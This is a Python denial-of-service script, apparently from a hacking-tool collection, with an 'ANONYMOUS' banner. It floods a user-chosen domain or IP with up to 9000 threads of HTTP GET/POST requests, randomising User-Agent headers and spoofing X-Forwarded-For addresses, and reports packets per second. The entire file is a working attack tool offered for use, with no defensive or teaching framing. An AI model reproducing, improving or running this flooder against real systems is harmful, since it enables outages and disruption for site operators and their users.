#!/usr/bin/env python3
import socket
import threading
import random
import time
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

REQUESTS_SENT = 0
BYTES_SENT = 0
LOCK = threading.Lock()
event = threading.Event()

class bcolors:
    OK = Fore.GREEN
    WARNING = Fore.YELLOW
    ERROR = Fore.RED
    INFO = Fore.CYAN
    RESET = Style.RESET_ALL

def generate_headers(method, target):
    user_agents = [
        "Mozilla/5.0 (Linux; Android 10)", "Chrome/114.0", "Safari/537.36",
        "Opera/9.80", "Edge/91.0", "Mozilla/5.0 (iPhone; CPU iOS 13)"
    ]
    method = method if method in ["GET", "POST"] else "GET"
    payload = f"{method} /?={random.randint(1,9999)} HTTP/1.1\r\n"
    payload += f"Host: {target}\r\n"
    payload += f"User-Agent: {random.choice(user_agents)}\r\n"
    payload += f"X-Forwarded-For: {'.'.join(str(random.randint(1,255)) for _ in range(4))}\r\n"
    payload += "Accept: */*\r\nConnection: keep-alive\r\n\r\n"
    return payload.encode()

def attack(ip, port, method, thread_id):
    global REQUESTS_SENT, BYTES_SENT
    while not event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((ip, port))
            data = generate_headers(method, ip)
            sock.sendall(data)
            with LOCK:
                REQUESTS_SENT += 1
                BYTES_SENT += len(data)
                print(f"{bcolors.OK}[Thread-{thread_id}] Packet Sent ✓{bcolors.RESET}")
            sock.close()
        except socket.timeout:
            print(f"{bcolors.WARNING}[Thread-{thread_id}] Timeout...{bcolors.RESET}")
        except Exception as e:
            print(f"{bcolors.ERROR}[Thread-{thread_id}] Error: {e}{bcolors.RESET}")

def ToolsConsole():
    os.system("clear")
    print(f"""{bcolors.INFO}
  █████╗ ██████╗ ███╗   ██╗ ██████╗ ███╗   ███╗ ██████╗ ███████╗
 ██╔══██╗██╔═══██╗████╗  ██║██╔═══██╗████╗ ████║██╔═══██╗██╔════╝
 ███████║██║   ██║██╔██╗ ██║██║   ██║██╔████╔██║██║   ██║█████╗  
 ██╔══██║██║   ██║██║╚██╗██║██║   ██║██║╚██╔╝██║██║   ██║██╔══╝  
 ██║  ██║╚██████╔╝██║ ╚████║╚██████╔╝██║ ╚═╝ ██║╚██████╔╝███████╗
 ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝ ╚═════╝ ╚══════╝
       Creator: naveen_anon
{bcolors.RESET}""")

    target = input(f"{bcolors.WARNING}Target Domain or IP: {bcolors.RESET}")
    try:
        port = int(input(f"{bcolors.WARNING}Port [default:80]: {bcolors.RESET}") or 80)
    except:
        port = 80

    method = input(f"{bcolors.WARNING}Method [GET/POST/RANDOM]: {bcolors.RESET}").upper()
    if method == "RANDOM":
        method = random.choice(["GET", "POST"])
    elif method not in ["GET", "POST"]:
        method = "GET"

    try:
        threads = int(input(f"{bcolors.WARNING}Number of Threads [Max 9000]: {bcolors.RESET}") or 500)
        threads = min(threads, 9000)
    except:
        threads = 500

    try:
        socket.inet_aton(target)
        ip = target
    except:
        try:
            ip = socket.gethostbyname(target)
        except:
            print(f"{bcolors.ERROR}Invalid domain or IP.{bcolors.RESET}")
            return

    print(f"{bcolors.INFO}Launching attack on {ip}:{port} with {threads} threads...{bcolors.RESET}")

    global REQUESTS_SENT, BYTES_SENT
    REQUESTS_SENT = 0
    BYTES_SENT = 0
    ts = time.time()

    for i in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, method, i+1))
        thread.daemon = True
        thread.start()

    try:
        while True:
            time.sleep(2)
            elapsed = int(time.time() - ts)
            print(f"{bcolors.WARNING}[INFO] Elapsed: {elapsed}s | Threads: {threads} | PPS: {REQUESTS_SENT} | BPS: {BYTES_SENT}{bcolors.RESET}")
            with LOCK:
                REQUESTS_SENT = 0
                BYTES_SENT = 0
    except KeyboardInterrupt:
        event.set()
        print(f"\n{bcolors.ERROR}Attack stopped by user.{bcolors.RESET}")
        sys.exit(0)

if __name__ == "__main__":
    ToolsConsole()
    